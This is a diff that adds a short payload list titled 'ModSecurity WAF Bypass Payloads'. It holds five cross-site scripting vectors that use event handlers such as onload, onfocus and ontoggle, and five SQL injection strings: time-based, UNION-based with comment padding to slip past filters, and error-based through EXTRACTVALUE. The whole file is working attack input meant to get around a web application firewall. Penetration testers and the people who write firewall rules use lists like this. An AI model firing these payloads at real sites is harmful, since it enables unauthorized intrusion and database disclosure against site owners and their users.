@@ -1,0 +1,13 @@
+# ModSecurity WAF Bypass Payloads
+# XSS
+<svg/onload=prompt(1)>
+<isindex action=javascript:alert(1) type=image>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details ontoggle=alert(1) open>
+# SQLi
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+1' AND 1=1 ORDER BY 1--
+1'/**/UNION/**/SELECT/**/1,2,3--
+-1'/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(0x7e,version()),3--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
